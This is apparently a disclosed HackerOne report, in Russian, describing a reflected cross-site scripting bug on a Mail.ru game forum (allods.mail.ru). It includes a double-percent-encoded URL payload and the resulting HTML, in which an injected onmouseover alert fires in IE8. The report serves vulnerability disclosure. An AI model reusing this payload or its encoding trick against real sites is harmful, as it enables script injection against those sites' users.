@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/95841
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bigbear_
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:27.03.2017 13:11:36
+
+Summary:
+
+Приветствую. Для воспроизведения ошибки нужен IE8 + отключить фильтр XSS.
+
+https://allods.mail.ru/forums/newreply.php/%2522%256F%256E%256D%256F%2575%2573%2565%256F%2576%2565%2572%253D%2527%2561%256C%2565%2572%2574%2528%2531%2530%2530%2529%2527%2562%2561%2564%253D%2522
+
+При наведении на кнопку "Вверх" вылезет alert().
+
+Кусок html-текста:
+
+<li><a href="/../../../../forums/newreply.php/"onmouseover='alert(100)'bad="#top" onclick="document.location.hash='top'; return false;"><em></em>Вверх</a></li>
